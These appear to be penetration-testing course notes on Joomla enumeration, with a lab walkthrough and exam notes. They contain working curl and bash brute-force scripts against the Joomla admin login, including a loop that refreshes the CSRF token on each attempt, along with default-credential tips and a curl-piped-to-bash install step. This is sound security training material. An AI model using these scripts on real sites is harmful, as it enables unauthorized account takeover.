# Section 5 — Joomla: Discovery & Enumeration

Joomla = ~3.5% CMS market share, ~2.5M live installs. Written in PHP, MySQL backend.
54% of Joomla CVEs are in extensions (same plugin surface-area problem as WordPress).

---

## Fingerprinting Joomla

### Quick signals
| Signal | Location |
|--------|----------|
| `<meta name="generator" content="Joomla! - Open Source Content Management" />` | Page `<head>` |
| Characteristic `robots.txt` with `/administrator/`, `/bin/`, `/cache/`, etc. | `/robots.txt` |
| Joomla favicon | `/favicon.ico` (not always) |

```bash
curl -s http://target/ | grep -i joomla
curl -s http://target/robots.txt | head -20
```
> Fingerprints Joomla via the generator tag and robots.txt; swap `target` for the host.

### Version — most reliable sources (in priority order)

1. **`administrator/manifests/files/joomla.xml`** — exact version in `<version>` tag
```bash
curl -s http://target/administrator/manifests/files/joomla.xml | grep '<version>'
# <version>3.9.4</version>
```
> Reads the exact Joomla version from the manifest XML (most reliable source); swap `target` for the host.

2. **`README.txt`** — mentions major.minor series
```bash
curl -s http://target/README.txt | head -5
# * This is a Joomla! installation/upgrade package to version 3.x
```
> Reads the Joomla major.minor series from README.txt; swap `target` for the host.

3. **`plugins/system/cache/cache.xml`** — approximate version
```bash
curl -s http://target/plugins/system/cache/cache.xml | grep version
```
> Reads an approximate Joomla version from the cache plugin XML; swap `target` for the host.

4. **JS files** in `media/system/js/` — sometimes include version strings

---

## Login Portal

- Admin backend: `http://target/administrator/` or `/administrator/index.php`
- Generic error message: `"Username and password do not match or you do not have an account yet."`
  → No username enumeration possible via login error
- Default admin account name: `admin` (set at install; password configured at install time)

---

## Automated Scanning

### droopescan
Plugin-based scanner. Supports Joomla with limited functionality.

```bash
sudo pip3 install droopescan
droopescan scan joomla --url http://target/
```
> Installs and runs droopescan against Joomla for version range and known paths; swap `target` for the host.

Output includes:
- Possible version range (based on file hashes/paths)
- Interesting URLs: `administrator/manifests/files/joomla.xml`, login page, license file
- Doesn't find much beyond version range + known paths

### JoomlaScan (Python2)
Finds accessible directories and installed components. Requires Python 2.7.

```bash
# If Python 2.7 not available:
curl https://pyenv.run | bash
pyenv install 2.7 && pyenv shell 2.7
python2.7 -m pip install urllib3 certifi bs4

python2.7 joomlascan.py -u http://target/
```
> Sets up Python 2.7 then runs JoomlaScan to enumerate components and directories; swap `target` for the host.

Reveals installed components via `index.php?option=com_*` and explorable directories.
Less precise than droopescan for versioning, more useful for extension enumeration.

---

## Brute-Force Login

No CAPTCHA on default Joomla admin installs. Use `joomla-brute.py`:

```bash
sudo python3 joomla-brute.py \
    -u http://target \
    -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt \
    -usr admin
# admin:admin  ← default if not changed
```
> Brute-forces the Joomla admin login; swap `target`, the wordlist, and the `-usr` username.

Alternative — manual with curl (check for redirect to `/administrator/` on success):
```bash
curl -s -o /dev/null -w "%{http_code}" -X POST \
  "http://target/administrator/index.php" \
  -d "username=admin&passwd=admin&option=com_login&task=login&return=aW5kZXgucGhw&[token]=1"
```
> Manually attempts a Joomla admin login and reports the HTTP code; swap `target`, the creds, and the CSRF token.

The token changes per session — easier to script with a proper tool.

---

## Component Enumeration

Components expose attack surface via the `?option=com_*` parameter. Key components to note:

| Component | Notes |
|-----------|-------|
| `com_users` | User management |
| `com_content` | Article management |
| `com_media` | File uploads (check for restrictions) |
| `com_installer` | Extension installer — authenticated RCE if accessible |

JoomlaScan discovers these automatically. Cross-reference found components against known CVEs.

---

## Lab Walkthrough (`app.inlanefreight.local`)

### Q1 — Joomla version

```bash
curl -s http://app.inlanefreight.local/administrator/manifests/files/joomla.xml | grep '<version>'
# <version>3.10.0</version>
```
> Reads the lab's Joomla version from the manifest XML; swap the host for your target.

**Answer:** `3.10.0`

### Q2 — Admin password

`joomla-brute.py` is not on Kali by default. Use a bash loop with a fresh CSRF token per attempt:

```bash
for PASS in $(cat /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt); do
  TOKEN=$(curl -s -c /tmp/joomla_c.txt http://app.inlanefreight.local/administrator/index.php \
    | grep -oE '[a-f0-9]{32}' | tail -1)
  RESULT=$(curl -s -b /tmp/joomla_c.txt -c /tmp/joomla_c.txt \
    -X POST "http://app.inlanefreight.local/administrator/index.php" \
    --data-urlencode "username=admin" \
    --data-urlencode "passwd=${PASS}" \
    -d "option=com_login&task=login&return=aW5kZXgucGhw&${TOKEN}=1")
  if ! echo "$RESULT" | grep -q "do not match"; then
    echo "SUCCESS: admin:${PASS}"; break
  fi
done
# SUCCESS: admin:turnkey
```
> Bash brute-force loop fetching a fresh CSRF token per attempt against the Joomla admin login; swap the host, wordlist, and username.

**Answer:** `turnkey`

---

## Exam Notes

- Joomla version: check `administrator/manifests/files/joomla.xml` first — exact, machine-readable
- `README.txt` gives major.minor; `cache.xml` gives approximate; neither is as precise as the manifest
- Admin login at `/administrator/` — no user enumeration via error message
- droopescan gives version range; JoomlaScan gives component enumeration
- Default creds `admin:admin` are common — always try before brute forcing
- Components (`com_*`) are the plugin equivalent — check them for known CVEs
- ~3.5% market share = likely to appear on engagements but less common than WordPress
